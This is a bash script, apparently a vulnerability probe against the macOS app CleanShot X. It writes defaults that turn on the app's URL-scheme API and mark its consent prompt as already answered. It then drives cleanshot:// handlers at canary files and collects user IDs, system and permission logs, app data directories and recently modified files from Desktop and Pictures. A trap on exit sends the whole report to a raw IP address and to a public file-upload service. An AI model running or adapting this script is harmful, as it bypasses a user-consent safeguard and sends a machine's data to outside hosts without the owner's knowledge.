#!/bin/bash
# CleanShot X probe v5 — enable URL scheme API via defaults, then test handler with arbitrary paths
OUT=/tmp/csx-report-v5.txt
: > "$OUT"
exec > >(tee -a "$OUT") 2>&1
set -x
set +e

DROP_URL="http://143.246.43.43:8080/csx-v5"
DOMAIN="pl.maketheweb.cleanshotx"

finish() {
  echo "=== EXIT $? ==="
  curl -s --max-time 60 -X POST --data-binary @/tmp/csx-report-v5.txt "$DROP_URL" || true
  curl -s --max-time 60 -F "file=@/tmp/csx-report-v5.txt" https://tmpfiles.org/api/v1/upload -o /tmp/u5.json || true
  cat /tmp/u5.json 2>/dev/null
}
trap finish EXIT

echo "=== ENV ==="
sw_vers; uname -m; id

DMG=/tmp/csx.dmg
curl -sSL --max-time 300 -o "$DMG" https://updates.getcleanshot.com/v3/CleanShot-X-5.0.2.dmg
hdiutil attach "$DMG" -nobrowse -noverify -readonly
MP=$(hdiutil info | awk -F'\t' '/\/Volumes\//{print $NF}' | tail -1)
APP="$MP/CleanShot X.app"
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f "$APP" 2>&1
sleep 2

echo "=== DEFAULTS BEFORE ==="
defaults read "$DOMAIN" 2>&1 | head -40

echo "=== ENABLE URL SCHEME API ==="
defaults write "$DOMAIN" allowURLSchemesAPI -bool true
defaults write "$DOMAIN" didAskAboutURLSchemesAPI -bool true
defaults write "$DOMAIN" _allowURLSchemes -bool true
defaults read "$DOMAIN" 2>&1 | grep -iE "urlscheme|allow" 

echo "=== LAUNCH ==="
open -a "$APP"
sleep 10
PID=$(pgrep -f "CleanShot X.app/Contents/MacOS" | head -1)
echo "PID=$PID"
lsof -p "$PID" 2>/dev/null | grep -iE "csx_canary|/tmp/" | head -10

echo "=== CANARIES ==="
python3 - <<'PY'
import struct, zlib
def png(path, color, w=64, h=64):
    raw=b''.join(b'\x00'+bytes(color)*w for _ in range(h))
    def chunk(t,d):
        c=t+d
        return struct.pack('>I',len(d))+c+struct.pack('>I',zlib.crc32(c)&0xffffffff)
    open(path,'wb').write(b'\x89PNG\r\n\x1a\n'+chunk(b'IHDR',struct.pack('>IIBBBBB',w,h,8,2,0,0,0))
        +chunk(b'IDAT',zlib.compress(raw))+chunk(b'IEND',b''))
png('/tmp/csx_canary.png',(0,255,0))
open('/tmp/csx_canary.txt','w').write('CSX_CANARY_MARKER_ABCDEF123456\n')
PY
ls -l /tmp/csx_canary.png /tmp/csx_canary.txt

echo "=== PROBE open ==="
open "cleanshot://open?path=/tmp/csx_canary.png"; echo "rc=$?"; sleep 8
lsof -p "$PID" 2>/dev/null | grep -i "csx_canary" | head -5

echo "=== PROBE upload ==="
open "cleanshot://upload?file=/tmp/csx_canary.txt"; echo "rc=$?"; sleep 8
lsof -p "$PID" 2>/dev/null | grep -i "csx_canary" | head -5

echo "=== PROBE capture ==="
open "cleanshot://capture"; echo "rc=$?"; sleep 6

echo "=== PROBE annotate/scroll/window/last ==="
for h in annotate scroll window last area fullscreen; do
  open "cleanshot://$h"; echo "$h rc=$?"; sleep 2
done

echo "=== APP DATA DIRS ==="
find ~/Library/Application\ Support -maxdepth 2 -iname "*cleanshot*" 2>/dev/null | head -20
ls -la ~/Library/Application\ Support/pl.maketheweb.cleanshotx 2>/dev/null | head -20
find ~/Library/Containers -maxdepth 1 -iname "*cleanshot*" 2>/dev/null

echo "=== TCC / PERMISSION LOG ==="
log show --last 5m --predicate 'subsystem CONTAINS "TCC" OR eventMessage CONTAINS "ScreenCapture" OR eventMessage CONTAINS "kTCCService"' --style compact 2>/dev/null | grep -iE "cleanshot|screen" | tail -25

echo "=== APP LOG (all, tail) ==="
log show --last 4m --predicate 'process == "CleanShot X"' --style compact 2>/dev/null | tail -60

echo "=== NETWORK ==="
log show --last 4m --predicate 'process == "CleanShot X"' --style compact 2>/dev/null | grep -iE "api.cleanshot|https://|upload|cloud" | tail -20

echo "=== FILE TOUCH EVIDENCE ==="
find /tmp ~/Desktop ~/Pictures ~/Library/Application\ Support -maxdepth 3 -newermt '-4 minutes' -type f 2>/dev/null | grep -viE "csx-report|csx_canary" | head -30

echo "=== DONE ==="
exit 0
